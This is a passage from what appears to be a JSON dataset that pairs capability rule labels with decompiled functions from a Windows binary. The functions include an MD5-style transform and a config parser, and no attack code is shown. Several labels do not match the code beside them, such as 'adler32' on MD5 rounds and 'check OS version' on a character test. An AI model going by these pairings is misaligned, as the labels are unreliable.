        "decompiled_code": "\nvoid fcn.1800095e0(ulong arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uint32_t uStack24;\n    uint32_t uStack20;\n    \n    uStack24 = 0;\n    for (uStack20 = 0; uStack20 < arg4; uStack20 = uStack20 + 4) {\n        *(arg2 + uStack24 * 4) =\n             CONCAT13(*(arg3 + uStack20 + 3), \n                      CONCAT12(*(arg3 + uStack20 + 2), CONCAT11(*(arg3 + uStack20 + 1), *(arg3 + uStack20))));\n        uStack24 = uStack24 + 1;\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "180017fc": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.180017fc0(void)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint16_t *puVar4;\n    ulong uVar5;\n    ulong uVar6;\n    double dVar7;\n    uchar auStack1000 [40];\n    uchar auStack960 [40];\n    uchar auStack920 [40];\n    uchar auStack880 [40];\n    uchar auStack840 [40];\n    uchar auStack800 [32];\n    char cStack768;\n    uchar auStack760 [40];\n    int32_t iStack720;\n    int32_t iStack716;\n    uchar auStack712 [40];\n    uchar auStack672 [32];\n    int32_t iStack640;\n    int32_t iStack636;\n    uchar auStack632 [32];\n    int32_t iStack600;\n    int32_t iStack596;\n    int32_t iStack592;\n    uchar auStack584 [40];\n    uchar *puStack544;\n    uchar auStack536 [40];\n    uchar *puStack496;\n    uchar auStack488 [40];\n    uchar *puStack448;\n    uchar auStack440 [40];\n    uchar *puStack400;\n    uchar auStack392 [40];\n    uchar *puStack352;\n    uint auStack344 [2];\n    uchar auStack336 [40];\n    uchar *puStack296;\n    uchar auStack288 [32];\n    uchar auStack256 [40];\n    uchar *puStack216;\n    uchar auStack208 [40];\n    uchar *puStack168;\n    ulong uStack160;\n    ulong uStack152;\n    ulong uStack144;\n    ulong uStack136;\n    ulong uStack128;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    uint64_t uStack80;\n    ulong uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    uint64_t uStack40;\n    ulong uStack32;\n    uint64_t uStack24;\n    uint64_t uStack16;\n    \n    uStack160 = 0xfffffffffffffffe;\n    uStack16 = *0x180040248 ^ auStack1000;\n    fcn.180001f20(0x18004acf8, 0x18004ad90);\n    uVar2 = fcn.1800020f0(0x18004ad90);\n    if (uVar2 < 0x65) {\n        puStack496 = auStack536;\n        uStack136 = fcn.180001db0(puStack496, 0x18004ad90);\n        uStack128 = fcn.18000dfc0(auStack920, uStack136);\n        uVar5 = fcn.1800033a0(uStack128);\n        uVar6 = 100;\n        fcn.180015e80(0x18004a020, 100, uVar5);\n        fcn.180003370(auStack920, uVar6);\n    }\n    else {\n        uVar5 = 0x18004ad90;\n        fcn.180001db0(auStack760, 0x18004ad90);\n        iStack720 = fcn.180002140(auStack760, CONCAT62(uVar5 >> 0x10, 0x7c), 100);\n        fcn.180001fb0(auStack760, iStack720 + 1, *0x180039ea8);\n        puStack544 = auStack584;\n        uStack152 = fcn.180001db0(puStack544, auStack760);\n        uStack144 = fcn.18000dfc0(auStack960, uStack152);\n        uVar5 = fcn.1800033a0(uStack144);\n        uVar6 = 100;\n        fcn.180015e80(0x18004a020, 100, uVar5);\n        fcn.180003370(auStack960, uVar6);\n        fcn.180001ef0(auStack760, uVar6);\n    }\n    fcn.180001f20(0x18004acb0, 0x18004ad40);\n    uVar2 = fcn.1800020f0(0x18004ad40);\n    if (uVar2 < 0x65) {\n        puStack400 = auStack440;\n        uStack104 = fcn.180001db0(puStack400, 0x18004ad40);\n        uStack96 = fcn.18000dfc0(auStack840, uStack104);\n        uVar5 = fcn.1800033a0(uStack96);\n        uVar6 = 100;\n        fcn.180015e80(0x18004a090, 100, uVar5);\n        fcn.180003370(auStack840, uVar6);\n    }\n    else {\n        uVar5 = 0x18004ad40;\n        fcn.180001db0(auStack712, 0x18004ad40);\n        iStack716 = fcn.180002140(auStack712, CONCAT62(uVar5 >> 0x10, 0x7c), 100);\n        fcn.180001fb0(auStack712, iStack716, *0x180039ea8);\n        puStack448 = auStack488;\n        uStack120 = fcn.180001db0(puStack448, auStack712);\n        uStack112 = fcn.18000dfc0(auStack880, uStack120);\n        uVar5 = fcn.1800033a0(uStack112);\n        uVar6 = 100;\n        fcn.180015e80(0x18004a090, 100, uVar5);\n        fcn.180003370(auStack880, uVar6);\n        fcn.180001ef0(auStack712, uVar6);\n    }\n    fcn.18001c4e0(0x18004acd8);\n    iVar3 = fcn.180002100(0x18004ad68, CONCAT62(uVar6 >> 0x10, 0x7c), 0);\n    if (iVar3 == -1) {\n        uVar5 = 0;\n        puVar4 = fcn.18000e550(0x18004ad68, 0);\n        iVar1 = fcn.180024514(*puVar4);\n        if (iVar1 == 0) {\n            *0x180049e04 = 0x50;\n        }\n        else {\n            uVar5 = 0;\n            dVar7 = fcn.180015db0(0x18004ad68, 0);\n            *0x180049e04 = dVar7;\n        }\n    }\n    else {\n        puStack352 = auStack392;\n        uVar5 = fcn.180001db0(puStack352, 0x18004ad68);\n        uStack88 = uVar5;\n        fcn.18000e2c0(auStack672, uVar5, 0x180038814);\n        iStack640 = 0;\n        while( true ) {\n            uStack80 = iStack640;\n            uVar2 = fcn.18000ee60(auStack672);\n            if (uVar2 <= uStack80) break;\n            uVar6 = fcn.18001c570(auStack672, iStack640);\n            uVar5 = 0;\n            puVar4 = fcn.18000e550(uVar6, 0);\n            iVar1 = fcn.180024514(*puVar4);\n            if (iVar1 != 0) {\n                uVar5 = fcn.18001c570(auStack672, iStack640);\n                dVar7 = fcn.180015db0(uVar5, 0);\n                auStack344[0] = dVar7;\n                fcn.18001c350(0x18004acd8, auStack344);\n                uVar6 = fcn.18001c570(auStack672, iStack640);\n                uVar5 = 0;\n                dVar7 = fcn.180015db0(uVar6, 0);\n                *0x180049e04 = dVar7;\n            }\n            iStack640 = iStack640 + 1;\n        }\n        fcn.18000e630(auStack672);\n    }\n    iVar3 = fcn.1800020f0(0x18004adb8);\n    if (iVar3 != 0) {\n        uVar5 = 0;\n        puVar4 = fcn.18000e550(0x18004adb8, 0);\n        iVar1 = fcn.180024514(*puVar4);\n        if (iVar1 != 0) {\n            uVar5 = 0;\n            dVar7 = fcn.180015db0(0x18004adb8, 0);\n            *0x18004a018 = dVar7;\n        }\n    }\n    fcn.18000eee0(0x18004af40);\n    iVar3 = fcn.1800020f0(0x18004ade0);\n    if (iVar3 != 0) {\n        iVar3 = fcn.180002100(0x18004ade0, CONCAT62(uVar5 >> 0x10, 0x3b), 0);\n        if (iVar3 == -1) {\n            fcn.18000e660(0x18004af40, 0x18004ade0);\n        }\n        else {\n            puStack296 = auStack336;\n            uStack72 = fcn.180001db0(puStack296, 0x18004ade0);\n            uStack64 = fcn.18000e2c0(auStack288, uStack72, 0x180038884);\n            uStack56 = uStack64;\n            fcn.18001c540(0x18004af40, uStack64);\n            fcn.18000e630(auStack288);\n        }\n    }\n    cStack768 = '\\x01';\n    fcn.1800011f0(0x18004a9b0, 0x2a0);\n    puStack216 = auStack256;\n    uStack48 = fcn.180001db0(puStack216, 0x18004aed0);\n    fcn.18000e2c0(auStack800, uStack48, 0x1800388a4);\n    iVar3 = fcn.18000ee60(auStack800);\n    if (iVar3 == 7) {\n        iStack636 = 0;\n        while( true ) {\n            uStack40 = iStack636;\n            uVar2 = fcn.18000ee60(auStack800);\n            if (uVar2 <= uStack40) break;\n            puStack168 = auStack208;\n            uVar5 = fcn.18001c570(auStack800, iStack636);\n            uStack32 = fcn.180001db0(puStack168, uVar5);\n            fcn.18000e2c0(auStack632, uStack32, 0x1800388c4);\n            iVar3 = fcn.18000ee60(auStack632);\n            if (iVar3 != 0x18) {\n                cStack768 = '\\0';\n                fcn.18000e630(auStack632);\n                break;\n            }\n            iStack600 = 0;\n            while( true ) {\n                uStack24 = iStack600;\n                uVar2 = fcn.18000ee60(auStack632);\n                if (uVar2 <= uStack24) break;\n                uVar5 = fcn.18001c570(auStack632, iStack600);\n                puVar4 = fcn.18000e550(uVar5, 0);\n                iVar1 = fcn.180024514(*puVar4);\n                if (iVar1 != 0) {\n                    uVar5 = fcn.18001c570(auStack632, iStack600);\n                    dVar7 = fcn.180015db0(uVar5, 0);\n                    *(iStack636 * 0x60 + 0x18004a9b0 + iStack600 * 4) = dVar7;\n                }\n                iStack600 = iStack600 + 1;\n            }\n            fcn.18000e630(auStack632);\n            iStack636 = iStack636 + 1;\n        }\n    }\n    if (cStack768 == '\\0') {\n        for (iStack596 = 0; iStack596 < 7; iStack596 = iStack596 + 1) {\n            for (iStack592 = 0; iStack592 < 0x18; iStack592 = iStack592 + 1) {\n                *(iStack596 * 0x60 + 0x18004a9b0 + iStack592 * 4) = 1;\n            }\n        }\n    }\n    fcn.18000e630(auStack800);\n    fcn.180023980(uStack16 ^ auStack1000);\n    return;\n}\n",
        "token_count": 2925
    },
    "18001269": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuchar fcn.180012690(uint8_t param_1)\n\n{\n    int32_t iVar1;\n    uchar uStack24;\n    \n    iVar1 = fcn.180024594(param_1);\n    if (((iVar1 == 0) && (param_1 != 10)) && (param_1 != 0xd)) {\n        uStack24 = 0;\n    }\n    else {\n        uStack24 = 1;\n    }\n    return uStack24;\n}\n",
        "token_count": 103
    },
    "180007dc": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid fcn.180007dc0(ulong arg1, int32_t *arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uchar auStack152 [48];\n    int32_t iStack104;\n    int32_t iStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    int32_t iStack88;\n    int32_t iStack84;\n    int32_t iStack80;\n    int32_t iStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t iStack56;\n    int32_t iStack52;\n    int32_t iStack48;\n    int32_t iStack44;\n    uint32_t uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint64_t uStack16;\n    \n    uStack16 = *0x180040248 ^ auStack152;\n    uStack36 = 0;\n    uStack40 = *arg2;\n    uStack32 = arg2[1];\n    uStack24 = arg2[2];\n    uStack28 = arg2[3];\n    fcn.1800095e0(arg1, &iStack104, arg3, 0x40);\n    uVar1 = (uStack32 & uStack24 | ~uStack32 & uStack28) + iStack104 + uStack40 + -0x28955b88;\n    uVar2 = (uVar1 * 0x80 | uVar1 >> 0x19) + uStack32;\n    uVar1 = (uVar2 & uStack32 | ~uVar2 & uStack24) + iStack100 + uStack28 + 0xe8c7b756;\n    uVar3 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar2;\n    uVar1 = uStack24 + 0x242070db + (uVar3 & uVar2 | ~uVar3 & uStack32) + iStack96;\n    uVar4 = (uVar1 * 0x20000 | uVar1 >> 0xf) + uVar3;\n    uVar1 = (uVar4 & uVar3 | ~uVar4 & uVar2) + iStack92 + uStack32 + 0xc1bdceee;\n    uVar5 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar4;\n    uVar1 = (uVar5 & uVar4 | ~uVar5 & uVar3) + iStack88 + uVar2 + 0xf57c0faf;\n    uVar2 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar5;\n    uVar1 = uVar3 + 0x4787c62a + (uVar2 & uVar5 | ~uVar2 & uVar4) + iStack84;\n    uVar3 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar2;\n    uVar1 = (uVar3 & uVar2 | ~uVar3 & uVar5) + iStack80 + uVar4 + 0xa8304613;\n    uVar4 = (uVar1 * 0x20000 | uVar1 >> 0xf) + uVar3;\n    uVar1 = (uVar4 & uVar3 | ~uVar4 & uVar2) + iStack76 + uVar5 + 0xfd469501;\n    uVar5 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar4;\n    uVar1 = uVar2 + 0x698098d8 + (uVar5 & uVar4 | ~uVar5 & uVar3) + iStack72;\n    uVar2 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar5;\n    uVar1 = (uVar2 & uVar5 | ~uVar2 & uVar4) + iStack68 + uVar3 + 0x8b44f7af;\n    uVar3 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar2;\n    uVar1 = (uVar3 & uVar2 | ~uVar3 & uVar5) + iStack64 + (uVar4 - 0xa44f);\n    uVar4 = (uVar1 * 0x20000 | uVar1 >> 0xf) + uVar3;\n    uVar1 = (uVar4 & uVar3 | ~uVar4 & uVar2) + iStack60 + uVar5 + 0x895cd7be;\n    uVar5 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar4;\n    uVar1 = uVar2 + 0x6b901122 + (uVar5 & uVar4 | ~uVar5 & uVar3) + iStack56;\n    uVar2 = (uVar1 * 0x80 | uVar1 >> 0x19) + uVar5;\n    uVar1 = (uVar2 & uVar5 | ~uVar2 & uVar4) + iStack52 + uVar3 + 0xfd987193;\n    uVar3 = (uVar1 * 0x1000 | uVar1 >> 0x14) + uVar2;\n    uVar1 = (uVar3 & uVar2 | ~uVar3 & uVar5) + iStack48 + uVar4 + 0xa679438e;\n    uVar4 = (uVar1 * 0x20000 | uVar1 >> 0xf) + uVar3;\n    uVar1 = uVar5 + 0x49b40821 + (uVar4 & uVar3 | ~uVar4 & uVar2) + iStack44;\n    uVar5 = (uVar1 * 0x400000 | uVar1 >> 10) + uVar4;\n    uVar1 = (uVar5 & uVar3 | uVar4 & ~uVar3) + iStack100 + uVar2 + 0xf61e2562;\n    uVar2 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar5;\n    uVar1 = (uVar2 & uVar4 | uVar5 & ~uVar4) + iStack80 + uVar3 + 0xc040b340;\n    uVar3 = (uVar1 * 0x200 | uVar1 >> 0x17) + uVar2;\n    uVar1 = uVar4 + 0x265e5a51 + (uVar3 & uVar5 | uVar2 & ~uVar5) + iStack60;\n    uVar4 = (uVar1 * 0x4000 | uVar1 >> 0x12) + uVar3;\n    uVar1 = (uVar4 & uVar2 | uVar3 & ~uVar2) + iStack104 + uVar5 + 0xe9b6c7aa;\n    uVar5 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar4;\n    uVar1 = (uVar5 & uVar3 | uVar4 & ~uVar3) + iStack84 + uVar2 + 0xd62f105d;\n    uVar2 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar5;\n    uVar1 = uVar3 + 0x2441453 + (uVar2 & uVar4 | uVar5 & ~uVar4) + iStack64;\n    uVar3 = (uVar1 * 0x200 | uVar1 >> 0x17) + uVar2;\n    uVar1 = (uVar3 & uVar5 | uVar2 & ~uVar5) + iStack44 + uVar4 + 0xd8a1e681;\n    uVar4 = (uVar1 * 0x4000 | uVar1 >> 0x12) + uVar3;\n    uVar1 = (uVar4 & uVar2 | uVar3 & ~uVar2) + iStack88 + uVar5 + 0xe7d3fbc8;\n    uVar5 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar4;\n    uVar1 = uVar2 + 0x21e1cde6 + (uVar5 & uVar3 | uVar4 & ~uVar3) + iStack68;\n    uVar2 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar5;\n    uVar1 = (uVar2 & uVar4 | uVar5 & ~uVar4) + iStack48 + uVar3 + 0xc33707d6;\n    uVar3 = (uVar1 * 0x200 | uVar1 >> 0x17) + uVar2;\n    uVar1 = (uVar3 & uVar5 | uVar2 & ~uVar5) + iStack92 + uVar4 + 0xf4d50d87;\n    uVar4 = (uVar1 * 0x4000 | uVar1 >> 0x12) + uVar3;\n    uVar1 = uVar5 + 0x455a14ed + (uVar4 & uVar2 | uVar3 & ~uVar2) + iStack72;\n    uVar5 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar4;\n    uVar1 = (uVar5 & uVar3 | uVar4 & ~uVar3) + iStack52 + uVar2 + 0xa9e3e905;\n    uVar2 = (uVar1 * 0x20 | uVar1 >> 0x1b) + uVar5;\n    uVar1 = (uVar2 & uVar4 | uVar5 & ~uVar4) + iStack96 + uVar3 + 0xfcefa3f8;\n    uVar3 = (uVar1 * 0x200 | uVar1 >> 0x17) + uVar2;\n    uVar1 = uVar4 + 0x676f02d9 + (uVar3 & uVar5 | uVar2 & ~uVar5) + iStack76;\n    uVar4 = (uVar1 * 0x4000 | uVar1 >> 0x12) + uVar3;\n    uVar1 = (uVar4 & uVar2 | uVar3 & ~uVar2) + iStack56 + uVar5 + 0x8d2a4c8a;\n    uVar5 = (uVar1 * 0x100000 | uVar1 >> 0xc) + uVar4;\n    uVar1 = (uVar5 ^ uVar4 ^ uVar3) + iStack84 + (uVar2 - 0x5c6be);\n    uVar2 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar5;\n    uVar1 = (uVar2 ^ uVar5 ^ uVar4) + iStack72 + uVar3 + 0x8771f681;\n    uVar3 = (uVar1 * 0x800 | uVar1 >> 0x15) + uVar2;\n    uVar1 = uVar4 + 0x6d9d6122 + (uVar3 ^ uVar2 ^ uVar5) + iStack60;\n    uVar4 = (uVar1 * 0x10000 | uVar1 >> 0x10) + uVar3;\n    uVar1 = (uVar4 ^ uVar3 ^ uVar2) + iStack48 + uVar5 + 0xfde5380c;\n    uVar5 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar4;\n    uVar1 = (uVar5 ^ uVar4 ^ uVar3) + iStack100 + uVar2 + 0xa4beea44;\n    uVar2 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar5;\n    uVar1 = uVar3 + 0x4bdecfa9 + (uVar2 ^ uVar5 ^ uVar4) + iStack88;\n    uVar3 = (uVar1 * 0x800 | uVar1 >> 0x15) + uVar2;\n    uVar1 = (uVar3 ^ uVar2 ^ uVar5) + iStack76 + uVar4 + 0xf6bb4b60;\n    uVar4 = (uVar1 * 0x10000 | uVar1 >> 0x10) + uVar3;\n    uVar1 = (uVar4 ^ uVar3 ^ uVar2) + iStack64 + uVar5 + 0xbebfbc70;\n    uVar5 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar4;\n    uVar1 = uVar2 + 0x289b7ec6 + (uVar5 ^ uVar4 ^ uVar3) + iStack52;\n    uVar2 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar5;\n    uVar1 = (uVar2 ^ uVar5 ^ uVar4) + iStack104 + uVar3 + 0xeaa127fa;\n    uVar3 = (uVar1 * 0x800 | uVar1 >> 0x15) + uVar2;\n    uVar1 = (uVar3 ^ uVar2 ^ uVar5) + iStack92 + uVar4 + 0xd4ef3085;\n    uVar4 = (uVar1 * 0x10000 | uVar1 >> 0x10) + uVar3;\n    uVar1 = uVar5 + 0x4881d05 + (uVar4 ^ uVar3 ^ uVar2) + iStack80;\n    uVar5 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar4;\n    uVar1 = (uVar5 ^ uVar4 ^ uVar3) + iStack68 + uVar2 + 0xd9d4d039;\n    uVar2 = (uVar1 * 0x10 | uVar1 >> 0x1c) + uVar5;\n    uVar1 = (uVar2 ^ uVar5 ^ uVar4) + iStack56 + uVar3 + 0xe6db99e5;\n    uVar3 = (uVar1 * 0x800 | uVar1 >> 0x15) + uVar2;\n    uVar1 = uVar4 + 0x1fa27cf8 + (uVar3 ^ uVar2 ^ uVar5) + iStack44;\n    uVar4 = (uVar1 * 0x10000 | uVar1 >> 0x10) + uVar3;\n    uVar1 = (uVar4 ^ uVar3 ^ uVar2) + iStack96 + uVar5 + 0xc4ac5665;\n    uVar5 = (uVar1 * 0x800000 | uVar1 >> 9) + uVar4;\n    uVar1 = (uVar4 ^ (uVar5 | ~uVar3)) + iStack104 + uVar2 + 0xf4292244;\n    uVar2 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar5;\n    uVar1 = uVar3 + 0x432aff97 + (uVar5 ^ (uVar2 | ~uVar4)) + iStack76;\n    uVar3 = (uVar1 * 0x400 | uVar1 >> 0x16) + uVar2;\n    uVar1 = (uVar2 ^ (uVar3 | ~uVar5)) + iStack48 + uVar4 + 0xab9423a7;\n    uVar4 = (uVar1 * 0x8000 | uVar1 >> 0x11) + uVar3;\n    uVar1 = (uVar3 ^ (uVar4 | ~uVar2)) + iStack84 + uVar5 + 0xfc93a039;\n    uVar5 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar4;\n    uVar1 = uVar2 + 0x655b59c3 + (uVar4 ^ (uVar5 | ~uVar3)) + iStack56;\n    uVar2 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar5;\n    uVar1 = (uVar5 ^ (uVar2 | ~uVar4)) + iStack92 + uVar3 + 0x8f0ccc92;\n    uVar3 = (uVar1 * 0x400 | uVar1 >> 0x16) + uVar2;\n    uVar1 = (uVar2 ^ (uVar3 | ~uVar5)) + iStack64 + (uVar4 - 0x100b83);\n    uVar4 = (uVar1 * 0x8000 | uVar1 >> 0x11) + uVar3;\n    uVar1 = (uVar3 ^ (uVar4 | ~uVar2)) + iStack100 + uVar5 + 0x85845dd1;\n    uVar5 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar4;\n    uVar1 = uVar2 + 0x6fa87e4f + (uVar4 ^ (uVar5 | ~uVar3)) + iStack72;\n    uVar2 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar5;\n    uVar1 = (uVar5 ^ (uVar2 | ~uVar4)) + iStack44 + uVar3 + 0xfe2ce6e0;\n    uVar3 = (uVar1 * 0x400 | uVar1 >> 0x16) + uVar2;\n    uVar1 = (uVar2 ^ (uVar3 | ~uVar5)) + iStack80 + uVar4 + 0xa3014314;\n    uVar4 = (uVar1 * 0x8000 | uVar1 >> 0x11) + uVar3;\n    uVar1 = uVar5 + 0x4e0811a1 + (uVar3 ^ (uVar4 | ~uVar2)) + iStack52;\n    uVar5 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar4;\n    uVar1 = (uVar4 ^ (uVar5 | ~uVar3)) + iStack88 + uVar2 + 0xf7537e82;\n    uStack40 = (uVar1 * 0x40 | uVar1 >> 0x1a) + uVar5;\n    uVar1 = (uVar5 ^ (uStack40 | ~uVar4)) + iStack60 + uVar3 + 0xbd3af235;\n    uStack28 = (uVar1 * 0x400 | uVar1 >> 0x16) + uStack40;\n    uVar1 = uVar4 + 0x2ad7d2bb + (uStack40 ^ (uStack28 | ~uVar5)) + iStack96;\n    uStack24 = (uVar1 * 0x8000 | uVar1 >> 0x11) + uStack28;\n    uVar1 = (uStack28 ^ (uStack24 | ~uStack40)) + iStack68 + uVar5 + 0xeb86d391;\n    uStack32 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uStack24;\n    *arg2 = *arg2 + uStack40;\n    arg2[1] = arg2[1] + uStack32;\n    arg2[2] = arg2[2] + uStack24;\n    arg2[3] = arg2[3] + uStack28;\n    fcn.1800096f0(arg1, &iStack104, 0, 0x40);\n    fcn.180023980(uStack16 ^ auStack152);\n    return;\n}\n",
        "token_count": 4773
    },
    "18002f5c": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_bp_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid fcn.18002f5cc(uint16_t *arg1, uint32_t *arg2)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint8_t uVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint64_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    int32_t iVar15;\n    ulong *puVar16;\n    int64_t iVar17;\n    int32_t iVar18;\n    int64_t iVar19;\n    int64_t iVar20;\n    bool bVar21;\n    uchar auStack152 [32];\n    uint32_t uStack120;\n    uint32_t uStack116;\n    uint32_t *puStack112;\n    ulong uStack104;\n    int32_t iStack96;\n    uint64_t uStack88;\n    int32_t iStack80;\n    uint64_t var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_20h;\n    ulong var_bp_18h;\n    ulong var_10h;\n    \n    var_40h = *0x180040248 ^ auStack152;\n    uVar6 = 0;\n    uStack116 = arg1[5] & 0x8000;\n    uVar13 = arg1[5] & 0x7fff;\n    uVar14 = uVar13 - 0x3fff;\n    uStack104 = CONCAT44(*(arg1 + 1), *(arg1 + 3));\n    uVar12 = 1;\n    iVar20 = 3;\n    iStack96 = *arg1 << 0x10;\n    iVar4 = 0;\n    puStack112 = arg2;\n    if (uVar14 == 0xffffc001) {\n        do {\n            if (*(&uStack104 + uVar6 * 4) != 0) {\n                uStack104 = 0;\n                iStack96 = 0;\n                iVar4 = 0;\n                break;\n            }\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < 3);\n    }\n    else {\n        uStack88 = uStack104;\n        iStack80 = *arg1 << 0x10;\n        uVar10 = str.5_v_[0] >> 0x1f & 0x1f;\n        uVar3 = str.5_v_[0] + uVar10;\n        iVar18 = uVar3 >> 5;\n        uVar3 = 0x1f - ((uVar3 & 0x1f) - uVar10);\n        uVar8 = uVar3;\n        iVar5 = 0;\n        if ((*(&uStack104 + iVar18 * 4) >> (uVar3 & 0x1f) & 1) != 0) {\n            if ((*(&uStack104 + iVar18 * 4) & ~(-1 << (uVar8 & 0x1f))) == 0) {\n                for (iVar7 = iVar18 + 1; iVar5 = iVar4,  iVar7 < 3; iVar7 = iVar7 + 1) {\n                    if (*(&uStack104 + iVar7 * 4) != 0) goto code_r0x00018002f6de;\n                }\n            }\n            else {\ncode_r0x00018002f6de:\n                uVar3 = str.5_v_[0] + L'\\xffffffff' >> 0x1f & 0x1f;\n                iVar4 = str.5_v_[0] + L'\\xffffffff' + uVar3;\n                iVar15 = iVar4 >> 5;\n                uVar10 = *(&uStack104 + iVar15 * 4);\n                uVar11 = 1 << (0x1f - ((iVar4 & 0x1f) - uVar3) & 0x1f);\n                uVar3 = uVar10 + uVar11;\n                if ((uVar3 < uVar10) || (uVar9 = uVar6,  uVar3 < uVar11)) {\n                    uVar9 = 1;\n                }\n                *(&uStack104 + iVar15 * 4) = uVar3;\n                iVar7 = iVar15 + -1;\n                iVar5 = uVar9;\n                if (-1 < iVar15 + -1) {\n                    do {\n                        iVar5 = uVar9;\n                        if (uVar9 == 0) break;\n                        uVar10 = *(&uStack104 + iVar7 * 4);\n                        uVar3 = uVar10 + 1;\n                        if ((uVar3 < uVar10) || (uVar9 = uVar6,  uVar3 == 0)) {\n                            uVar9 = uVar12;\n                        }\n                        *(&uStack104 + iVar7 * 4) = uVar3;\n                        iVar7 = iVar7 + -1;\n                        iVar5 = uVar9;\n                    } while (-1 < iVar7);\n                }\n            }\n        }\n        puVar1 = &uStack104 + iVar18 * 4;\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar7 = iVar18 + 1;\n        uStack120 = uVar14;\n        if (iVar7 < 3) {\n            fcn.180026050(&uStack104 + iVar7 * 4, 0, (3 - iVar7) * 4);\n        }\n        if (iVar5 != 0) {\n            uVar14 = uVar13 - 0x3ffe;\n        }\n        if (uVar14 < *0x180041494 - str.5_v_[0]) {\n            uStack104 = 0;\n            iStack96 = 0;\n            iVar4 = 0;\n        }\n        else if (*0x180041494 < uVar14) {\n            uVar13 = str.5_v_[1] >> 0x1f & 0x1f;\n            iVar4 = str.5_v_[1] + uVar13;\n            iVar5 = iVar4 >> 5;\n            uVar8 = iVar4;\n            cVar2 = uVar13;\n            if (uVar14 < *0x180041490) {\n                uStack104 = uStack104 & 0xffffffff7fffffff;\n                iVar4 = str.5_v_[3] + uVar14;\n                uVar8 = (uVar8 & 0x1f) - cVar2;\n                puVar16 = &uStack104;\n                do {\n                    uStack120 = *puVar16 & ~(-1 << (uVar8 & 0x1f));\n                    *puVar16 = *puVar16 >> (uVar8 & 0x1f) | uVar6;\n                    puVar16 = puVar16 + 4;\n                    uVar6 = uStack120 << (0x20 - uVar8 & 0x1f);\n                    iVar20 = iVar20 + -1;\n                } while (iVar20 != 0);\n                iVar20 = 2;\n                do {\n                    if (iVar20 < iVar5) {\n                        *(&uStack104 + iVar20 * 4) = 0;\n                    }\n                    else {\n                        *(&uStack104 + iVar20 * 4) = *(&uStack104 + iVar20 * 4 + iVar5 * -4);\n                    }\n                    iVar20 = iVar20 + -1;\n                } while (-1 < iVar20);\n            }\n            else {\n                uVar8 = (uVar8 & 0x1f) - cVar2;\n                uStack104 = 0x80000000;\n                iStack96 = 0;\n                puVar16 = &uStack104;\n                do {\n                    uStack120 = *puVar16 & ~(-1 << (uVar8 & 0x1f));\n                    *puVar16 = *puVar16 >> (uVar8 & 0x1f) | uVar6;\n                    puVar16 = puVar16 + 4;\n                    uVar6 = uStack120 << (0x20 - uVar8 & 0x1f);\n                    iVar20 = iVar20 + -1;\n                } while (iVar20 != 0);\n                iVar20 = 2;\n                do {\n                    if (iVar20 < iVar5) {\n                        *(&uStack104 + iVar20 * 4) = 0;\n                    }\n                    else {\n                        *(&uStack104 + iVar20 * 4) = *(&uStack104 + iVar20 * 4 + iVar5 * -4);\n                    }\n                    iVar20 = iVar20 + -1;\n                } while (-1 < iVar20);\n                iVar4 = str.5_v_[3] + *0x180041490;\n            }\n        }\n        else {\n            puVar16 = &uStack104;\n            uStack104 = uStack88;\n            iStack96 = iStack80;\n            uVar13 = 